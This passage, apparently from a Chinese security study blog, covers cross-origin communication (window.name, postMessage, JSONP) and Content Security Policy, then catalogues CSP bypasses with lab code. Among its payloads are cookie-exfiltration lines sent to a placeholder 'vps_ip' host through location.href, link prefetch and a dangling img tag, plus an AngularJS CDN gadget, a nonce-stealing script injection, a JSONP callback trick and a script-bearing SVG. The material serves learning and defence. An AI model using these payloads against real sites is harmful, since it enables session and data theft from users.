<li>访问流程：通过Console台的xx.contentWindow.name访问iframe中的name属性，浏览器返回了跨域访问拒绝。但是我们通过设置iframe的src为3.php (3.php可以不与1.php同域)，在iframe中的所有页面共享window.name，然后3.php中的脚本访问到不同源的页面2.php并获取到了window.name</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;iframe id=&apos;xx&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.name = &quot;flag&#123;this_is_flag&#125;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">----test1.www.xyz/3.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    alert(window.name);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/window-name-alert.png" alt="window-name-alert"></p>
<ul>
<li>注释<ul>
<li>window.name的值只能是字符串的形式，这个字符串的大小最大能允许2M左右甚至更大的一个容量，具体取决于不同的浏览器</li>
<li>▲ 不要把敏感数据存在window.name中，否则敏感数据可以被任何其他网页的JS脚本获取</li>
</ul>
</li>
</ul>
<h3 id="0X04-location-hash"><a href="#0X04-location-hash" class="headerlink" title="0X04 location.hash"></a>0X04 location.hash</h3><ul>
<li>location.hash其实就是URL的锚部分(从#号开始的部分)</li>
<li>原理<ul>
<li>改变hash并不会导致页面刷新，所以可以利用hash值来进行数据传递</li>
<li>不同域下location.hash也是不能相互读取的</li>
</ul>
</li>
<li>具体做法<ul>
<li>A域的页面a加载一个iframe，设置iframe的src为B域的b页面+#传输给b的数据</li>
<li>此时b页面的js脚本可以通过读取location.hash获得页面a传过来的数据，然后在b页面再生成一个iframe，src指向A域的页面c+#传输给a的数据</li>
<li>由于页面c与页面a同域同源，所以页面c的脚本可以修改a的locaition.hash</li>
</ul>
</li>
</ul>
<h3 id="0X05-PostMessage"><a href="#0X05-PostMessage" class="headerlink" title="0X05 PostMessage"></a>0X05 PostMessage</h3><ul>
<li>▲ window.postMessage()方法可以安全地实现跨源通信</li>
<li>当被调用时，会在所有页面脚本执行完毕之后向目标窗口派发一个MessageEvent消息函数<ul>
<li>第一个参数为发送的消息</li>
<li>第二个参数是匹配发送给的窗口的url地（可以使用*，代表无限制通配），若目标url和此参数不匹配，消息就不会被发送</li>
</ul>
</li>
<li>被接受窗口则可以通过监听message事件来获取接受信息</li>
<li>测试代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(&apos;message&apos;,function(e)&#123;</span><br><span class="line">        alert(e.data);</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    parent.postMessage(&apos;test&apos;,&apos;*&apos;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/postmessage-example.png" alt="postmessage-example"></p>
<ul>
<li>恶意代码测试（事件监听没有判断事件的来源）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?php</span><br><span class="line">setcookie(&apos;flag&apos;,&apos;flag&#123;this_is_flag&#125;&apos;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;h1 id=&quot;name&quot;&gt;&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(&apos;message&apos;,function(e)&#123;</span><br><span class="line">        document.getElementById(&apos;name&apos;).innerHTML = e.data</span><br><span class="line">        &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">----test2.www.xyz/evil.php</span><br><span class="line">&lt;iframe id=&quot;iframe&quot; src=&quot;//test1.www.xyz/1.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">//正则过滤的1.php</span><br><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;flag&quot;,&quot;flag&#123;this_is_flag&#125;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;h1 id=&quot;name&quot;&gt;&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(&apos;message&apos;,function(e)&#123;</span><br><span class="line">        if(/^http:\/\/.*www\.xyz$/.test(e.origin))</span><br><span class="line">        document.getElementById(&apos;name&apos;).innerHTML = e.data;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;   --------------&gt; 绕过方法：需要一个存在后缀为www.xyz的域名即可</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/postmessage-alert.png" alt="postmessage-alert"></p>
<h3 id="0X06-JSONP"><a href="#0X06-JSONP" class="headerlink" title="0X06 JSONP"></a>0X06 JSONP</h3><ul>
<li><code>&lt;script&gt;</code>标签可以跨域加载资源，但是返回内容如果不符合JS语法同样无法获取数据，JSONP则是通过返回符合JS语法的数据内容使资源能够跨域加载</li>
<li>测试代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function echoData(data)&#123;</span><br><span class="line">    console.log(&quot;DATA:&quot;,data);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;//test2.www.xyz/2.php?func=echoData&quot;&gt;&lt;/script&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">&lt;?php</span><br><span class="line">    header(&apos;Content-type: application/javascript&apos;);</span><br><span class="line">    $func = $_REQUEST[&apos;func&apos;]??&quot;func&quot;;</span><br><span class="line">    $data = &apos;[&quot;aaa&quot;,&quot;bbb&quot;,&quot;ccc&quot;,&quot;ddd&quot;]&apos;;</span><br><span class="line">    echo $func.&quot;(&quot;.$data.&quot;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/jsonp-example.png" alt="jsonp-example"></p>
<ul>
<li>运行过程：1.php页面先设定好输出数据的函数，通过<code>&lt;script&gt;</code>标签请求2.php并带有函数名参数，2.php把数据当函数参数传入并根据函数名输出对应函数调用语句，1.php获得响应后自动调用函数即可获取数据</li>
<li>不存在任何验证的JSONP接口</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test2.www.xyz/evail.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function echoData(data)&#123;</span><br><span class="line">    alert(&quot;username：&quot;+data.username+&quot;password：&quot;+data.password);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;//test1.www.xyz/1.php?func=echoData&quot;&gt;&lt;/script&gt;</span><br><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?php</span><br><span class="line">    header(&apos;Content-type: application/javascript&apos;);</span><br><span class="line">    $func = $_REQUEST[&apos;func&apos;]??&quot;func&quot;;</span><br><span class="line">    $data = &quot;&#123;&apos;username&apos;:&apos;test1&apos;,&apos;password&apos;:&apos;test1&apos;&#125;&quot;;</span><br><span class="line">    echo $func.&quot;(&quot;.$data.&quot;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/jsonp-username-password.jpg" alt="jsonp-username-password"></p>
<ul>
<li>▲ 未设置Conten-type可以导致反射性XSS<ul>
<li>但是就算设置好了Conten-type也可能会有安全隐患</li>
</ul>
</li>
<li>▲ 这种用户完全可控点可以结合很多其他缺陷产生漏洞，所以这种接口还应该过滤非法字符</li>
<li>防御方法<ul>
<li>验证referer，很多接口验证referer的正则有误，可以通过绕过正则继续攻击</li>
<li>验证token</li>
</ul>
</li>
</ul>
<h2 id="内容安全策略"><a href="#内容安全策略" class="headerlink" title="内容安全策略"></a>内容安全策略</h2><blockquote>
<p>   CSP, Content Security Policy</p>
</blockquote>
<ul>
<li>官方解释<ul>
<li>一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本(XSS)和数据注入等攻击。这些攻击可用于实现从数据窃取到网站破坏或作为恶意软件分发版本等用途</li>
</ul>
</li>
<li>通俗理解<ul>
<li>开发者明确告诉客户端（制定比较严格的策略和规则），哪些外部资源是可以加载和执行的</li>
</ul>
</li>
<li>概念理解<ul>
<li>CSP就是一个统一有效的防止网站受到XSS攻击的防御方法</li>
<li>CSP是一种白名单策略</li>
</ul>
</li>
</ul>
<h5 id="启用CSP"><a href="#启用CSP" class="headerlink" title="启用CSP"></a>启用CSP</h5><ul>
<li>通过HTTP头信息的Content-Security-Policy的字段（配置文件或者后端设置）</li>
<li>通过网页的<code>&lt;meta&gt;</code>标签<ul>
<li><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39;&quot;&gt;</code></li>
</ul>
</li>
<li>修改的限制<ul>
<li><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39; https://cdn.xxx.com&quot;&gt;</code>  -&gt; content添加白名单 -&gt; 即可以<code>script</code>标签引入cdb</li>
</ul>
</li>
</ul>
<h5 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h5><ul>
<li>script-src: 定义了页面中Javascript的有效来源</li>
<li>style-src：定义了页面中CSS样式的有效来源</li>
<li>img-src: 定义了页面中图片和图标的有效来源</li>
<li>font-src: 定义了字体加载的有效来源</li>
<li>media-src: 用于限制允许传输视频和音频的来源。</li>
<li>object-src: 可对 Flash 和其他插件进行控制。</li>
<li>plugin-types: 用于限制页面可以调用的插件种类。</li>
<li>child-src: 定义了web workers以及嵌套的浏览上下文（如<code>&lt;frame&gt;和&lt;iframe&gt;</code>）的源</li>
<li>content-src: 定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源</li>
<li>▲ default-src: 自定义默认形式<ul>
<li>如果同时设置某个单项限制（比如font-src）和default-src，前者会覆盖后者，即字体文件会采用font-src的值，其他资源依然采用default-src的值</li>
</ul>
</li>
</ul>
<h5 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h5><ul>
<li>‘none’ -&gt; img-src ‘none’<ul>
<li>不允许任何内容</li>
</ul>
</li>
<li>‘self’ -&gt; img-src ‘self’<ul>
<li>代表和文档同源，包括相同的URL协议和端口号。两侧单引号是必须的。</li>
</ul>
</li>
<li>‘unsafe-inline’ -&gt; script-src ‘unsafe-inline’<ul>
<li>允许加载inline资源（例如常见的style属性，onclick，inline js和inline css等等）</li>
</ul>
</li>
<li>‘unsafe-eval’ -&gt; script-src ‘unsafe-eval’<ul>
<li>允许加载动态js代码，例如eval()</li>
</ul>
</li>
<li>data: -&gt; img-src data:<ul>
<li>允许来自相同来源的内容（相同的协议、域名和端口）</li>
</ul>
</li>
<li>注解<ul>
<li>如果不特别指定<code>&#39;unsafe-inline&#39;</code>时，页面上所有inline样式和脚本都不会执行</li>
<li>不特别指定<code>&#39;unsafe-eval&#39;</code>，页面上不允许使用new Function，setTimeout，eval等方式执行动态代码</li>
</ul>
</li>
</ul>
<h5 id="收集不匹配规则的日志"><a href="#收集不匹配规则的日志" class="headerlink" title="收集不匹配规则的日志"></a>收集不匹配规则的日志</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//发生的CSP头</span><br><span class="line">Content-Security-Policy-Report-Only: script-src &apos;self&apos;; report-uri http://test/</span><br><span class="line"></span><br><span class="line">//这样，如果页面上有inline JS，依然会执行，只是浏览器会向指定地址发送一个POST请求，包含这样的信息</span><br><span class="line">&#123;&quot;csp-report&quot;:&#123;&quot;document-uri&quot;:&quot;http://test/test.php&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;violated-directive&quot;:&quot;script-src &apos;self&apos;&quot;,&quot;original-policy&quot;:&quot;script-src &apos;self&apos;; report-uri http://test/&quot;,&quot;blocked-uri&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP" target="_blank" rel="noopener">内容安全策略 (CSP)</a></li>
</ul>
<h2 id="内容安全策略的绕过"><a href="#内容安全策略的绕过" class="headerlink" title="内容安全策略的绕过"></a>内容安全策略的绕过</h2><ul>
<li>location.href</li>
<li>link标签导致的绕过</li>
<li>使用iframe绕过</li>
<li>用CDN绕过</li>
<li>站点可控静态资源绕过</li>
<li>站点可控JSONP绕过</li>
<li>Base-uri绕过</li>
<li>不完整script绕过nonce</li>
<li>object-src绕过（PDFXSS） -&gt; 暂无学</li>
<li>SVG绕过</li>
<li>不完整的资源标签获取资源</li>
<li>CSS选择器获取内容  -&gt;  暂无学</li>
<li>CRLF绕过</li>
</ul>
<h3 id="0X00-location-href"><a href="#0X00-location-href" class="headerlink" title="0X00 location.href"></a>0X00 location.href</h3><ul>
<li>CSP不影响location.href跳转</li>
<li>利用条件<ul>
<li>可以执行任意JS脚本，但是由于受到CSP影响无法外带数据</li>
</ul>
</li>
<li>将cookie打到个人vps上<ul>
<li><code>location.href = &quot;vps_ip:xxxx?+document.cookie</code></li>
</ul>
</li>
</ul>
<h3 id="0X01-link标签导致的绕过"><a href="#0X01-link标签导致的绕过" class="headerlink" title="0X01 link标签导致的绕过"></a>0X01 link标签导致的绕过</h3><ul>
<li>▲ 方法较老，不一定能成功实现，现在大部分浏览器的CSP开始约束这个标签</li>
<li>利用条件<ul>
<li>可以执行任意JS脚本，但是由于受到CSP影响无法外带数据</li>
</ul>
</li>
<li>利用标签将数据外带</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----SCP的限制</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-scr &apos;self&apos;&quot;&gt;</span><br><span class="line"></span><br><span class="line">----写死的外带link标签</span><br><span class="line">&lt;!-- firefox --&gt;</span><br><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//$&#123;cookie&#125;.vps_ip&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- chrome --&gt;</span><br><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?$&#123;cookie&#125;&#125;&quot;&gt;</span><br><span class="line"></span><br><span class="line">----不写死的外带link标签</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var link = document.createElement(&quot;link&quot;);</span><br><span class="line">link.setAttribute(&quot;rel&quot;,&quot;prefetch&quot;);</span><br><span class="line">link.setAttribute(&quot;href&quot;,&quot;//vps_ip?&quot;+document.cookie);</span><br><span class="line">documnet.head.appendChild(link);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0X02-使用iframe绕过"><a href="#0X02-使用iframe绕过" class="headerlink" title="0X02 使用iframe绕过"></a>0X02 使用iframe绕过</h3><ul>
<li>背景：当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效</li>
<li>利用条件<ul>
<li>一个同源站点内存在两个页面，一个页面存在CSP保护，另一个页面没有CSP保护且存在XSS漏洞（存在XSS漏洞原因是需要执行JS代码）</li>
<li>我们需要的数据在存在CSP保护的页面</li>
</ul>
</li>
<li>测试代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php  -&gt; A页面</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos; script-src &apos;self&apos;&quot;&gt;</span><br><span class="line">&lt;h1 id=&quot;flag&quot;&gt;flag&#123;this_is_flag&#125;&lt;/h1&gt;</span><br><span class="line">---test1.www.xyz/3.php  -&gt; B页面</span><br><span class="line">//模拟XSS</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var iframe = document.createElement(&apos;iframe&apos;);</span><br><span class="line">    iframe.src = &quot;1.php&quot;;</span><br><span class="line">    document.body.appenChild(iframe);</span><br><span class="line">    setTimeout(()=&gt;alert(iframe.contentView.document.getElementById(&apos;flag&apos;).innertHTML),1000)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/scp/iframe-alert.png" alt="iframe-alert"></p>
<h3 id="OXO3-用CDN来绕过"><a href="#OXO3-用CDN来绕过" class="headerlink" title="OXO3 用CDN来绕过"></a>OXO3 用CDN来绕过</h3><ul>
<li>背景<ul>
<li>前端会用到许多的前端框架和库，引用到其他CDN上的JS框架</li>
<li>CDN上如果存在一些低版本的框架，就可能存在绕过CSP的风险</li>
</ul>
</li>
<li>利用条件<ul>
<li>CDN服务商存在某些低版本的js库</li>
<li>CDN服务商在CSP白名单中</li>
<li>调用CDN服务商的js库</li>
</ul>
</li>
<li>引用orange师傅采用了低版本的angular js模板注入来绕过CSP</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- foo=&quot;--&gt;</span><br><span class="line">&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div ng-app&gt;</span><br><span class="line">    &#123;&#123;constructor.constructor(&apos;alert(document.cookie)&apos;)()&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">//sssss&quot; --&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果用了Jquery-mobile库，且CSP中包含<code>&quot;script-src &#39;unsafe-eval&#39;&quot;或者&quot;script-src &#39;strict-dynamic&#39;&quot;</code>，可以用此exp</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div data-role=popup id=&apos;&lt;script&gt;alert(1)&lt;/script&gt;&apos;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76" target="_blank" rel="noopener">低版本angular js的CDN服务商列表</a></li>
<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">库可以绕过CSP（来自blackhat2017）</a></li>
</ul>
<h3 id="0X04-站点可控静态资源绕过"><a href="#0X04-站点可控静态资源绕过" class="headerlink" title="0X04 站点可控静态资源绕过"></a>0X04 站点可控静态资源绕过</h3><ul>
<li>▲ 感觉跟CDN来绕过的方式有点像，都是调用外部的库或者包，然后可以引用</li>
<li>利用条件<ul>
<li>站点存在可控静态资源</li>
<li>站点在CSP白名单中</li>
</ul>
</li>
<li>例子<ul>
<li>如果前端的CSP中使用到了<a href="http://www.google-analytics.com" target="_blank" rel="noopener">www.google-analytics.com</a></li>
<li>而<a href="http://www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP" target="_blank" rel="noopener">www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP</a></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//访问www.google.analytics.com自定义js的功能，会得到一个id</span><br><span class="line">function test()&#123;</span><br><span class="line">    return alert(&quot;here&quot;)</span><br><span class="line">&#125;</span><br><span class="line">----test1.www.xyz/1.php（将获得的id填入下面的链接中的id即可）</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;unsafe-eval&apos; https://www.google-analytics.com&quot;&gt;</span><br><span class="line">&lt;script src=&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>同理，若其他站点下提供了可控静态资源的功能，且CSP中允许了此站点</li>
<li>▲ 2020.06.05 <a href="http://www.google.analytics.com暂无法进行访问" target="_blank" rel="noopener">www.google.analytics.com暂无法进行访问</a></li>
</ul>
<h3 id="0X05-站点可控JSONP绕过"><a href="#0X05-站点可控JSONP绕过" class="headerlink" title="0X05 站点可控JSONP绕过"></a>0X05 站点可控JSONP绕过</h3><ul>
<li>前提：大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析</li>
<li>利用条件<ul>
<li>站点存在可控Jsonp</li>
<li>站点在CSP白名单中</li>
</ul>
</li>
<li>例子：Google站点存在了用户可控jsonp</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src https://www.google.com&quot;&gt;</span><br><span class="line">&lt;script src=&quot;https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>▲ 配合注释，可以执行任意js</li>
<li><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">一些存在用户可控资源或者jsonp比较常用站点的github项目</a></li>
</ul>
<h3 id="0X06-Base-uri绕过"><a href="#0X06-Base-uri绕过" class="headerlink" title="0X06 Base-uri绕过"></a>0X06 Base-uri绕过</h3><blockquote>
<p>   无绝对路径的不完整资源</p>
</blockquote>
<ul>
<li>当服务器CSP的script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用<code>&lt;base&gt;</code>标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径</li>
<li>利用条件<ul>
<li>CSP中的script-src只使用nonce</li>
<li>没有额外设置base-uri</li>
<li>页面引用存在相对路径的<code>&lt;script&gt;</code>标签</li>
</ul>
</li>
<li>测试代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-test&apos;&quot;&gt;</span><br><span class="line">&lt;base href=&quot;//vps_ip/&quot;&gt;</span><br><span class="line">&lt;script nonce=&apos;test&apos; src=&quot;2.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0X07-不完整的script标签绕过nonce"><a href="#0X07-不完整的script标签绕过nonce" class="headerlink" title="0X07 不完整的script标签绕过nonce"></a>0X07 不完整的script标签绕过nonce</h3><ul>
<li>利用条件<ul>
<li>可控点在合法script标签上方,且其中没有其他标签</li>
<li>XSS页面的CSP的script-src只采用了nonce方式</li>
</ul>
</li>
<li>测试代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?php header(&quot;X-XSS-Protection:0&quot;);?&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src &apos;nonce-xxxx&apos;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;xss&apos;];?&gt;</span><br><span class="line">&lt;script nonce=&apos;xxxx&apos;&gt;</span><br><span class="line">    //do some thing</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>输入<code>http://test1.www.xyz/1.php?xss=&lt;script src=data:text/plain,alert(1)</code>，即造成xss</li>
<li>解释：这是因为当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性，所以第五行的<code>&lt;script</code>会变成一个属性，值为空，之后的nonce=’xxxxx’会被当成我们输入的script的标签的一个属性，相当于我们盗取了合法的script标签中的nonce，于是成功绕过了scripr-src</li>
</ul>
<p><img src="/images/sop_cors_csp/scp/nonce-example.png" alt="nonce-example"></p>
<ul>
<li>▲ 2020.06.05 本实验在Firefox上实验成功，在Chrome上不成功<ul>
<li>即使构造特殊的url<code>http://test1.www.xyz/1.php?xss=123&lt;script src=&quot;data:text/plain,alert(1)&quot; a=123 a=</code>，也无法成功，还是会受到CSP影响</li>
<li>特殊的url解析：先新建一个a属性，然后再新建第二个a属性，这样我们就将第二个<code>&lt;script</code>赋给了第二个a属性，浏览器在解析的时候直接忽略了第二个属性及其后面的值，这样Payload就能成功在chrome浏览器上执行</li>
<li>标签的一个技巧：当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略</li>
</ul>
</li>
</ul>
<p><img src="/images/sop_cors_csp/scp/nonce-chrome-error.png" alt="nonce-chrome-error"></p>
<h3 id="0X08-SVG绕过"><a href="#0X08-SVG绕过" class="headerlink" title="0X08 SVG绕过"></a>0X08 SVG绕过</h3><ul>
<li>SVG作为一个矢量图，但是却能够执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss</li>
<li>利用条件<ul>
<li>可以上传svg图片</li>
</ul>
</li>
<li>1.svg</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;</span><br><span class="line">    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/scp/svg-example.png" alt="svg-example"></p>
<h3 id="0X09-不完整的资源标签获取资源"><a href="#0X09-不完整的资源标签获取资源" class="headerlink" title="0X09 不完整的资源标签获取资源"></a>0X09 不完整的资源标签获取资源</h3><ul>
<li>利用条件<ul>
<li>可以加载外域资源（img-src: *）</li>
<li>需要获取页面某处的信息</li>
</ul>
</li>
<li>测试代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src &apos;self&apos;;img-src *;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;xss&apos;];?&gt;</span><br><span class="line">&lt;h1&gt;flag&#123;0xffff&#125;&lt;/h1&gt;</span><br><span class="line">&lt;h2 id=&quot;id&quot;&gt;3&lt;/h2&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>注解：这里可以注意到img用了*，有些网站会用很多外链图片，所以这个情况并不少见<br>虽然我们可以新建任意标签，但是由于CSP我们的JS并不能执行（没有unsafe-inline），于是我们可以用不完整的<code>&lt;img</code>标签来将数据带出</li>
<li>浏览器访问：<code>http://127.0.0.1/2.php?xss=&lt;img src=&quot;//vps_ip?a=</code><ul>
<li>此时，由于src的引号没有闭合，html解析器会去一直寻找第二个引号，引号其中的大部分标签都不会被解析，所以在第四行的第一个引号前的所有内容，都会被当成src的值被发送到我们的vps上</li>
</ul>
</li>
</ul>
<p><img src="/images/sop_cors_csp/scp/img-example.png" alt="img-example"></p>
<ul>
<li>▲ 2020.06.05 此实验在Chrome上无法成功执行，因为chrome不允许发出的url中含有回车或<code>&lt;</code>，否者不会发出</li>
</ul>
<p><img src="/images/sop_cors_csp/scp/img-chrome-error.png" alt="img-chrome-error"> </p>
<h3 id="0X10-CRLF绕过"><a href="#0X10-CRLF绕过" class="headerlink" title="0X10 CRLF绕过"></a>0X10 CRLF绕过</h3><ul>
<li>当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中，这样就绕过了CSP</li>
</ul>
<h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><a href="https://xz.aliyun.com/t/5084#toc-11" target="_blank" rel="noopener">我的CSP绕过思路及总结</a></li>
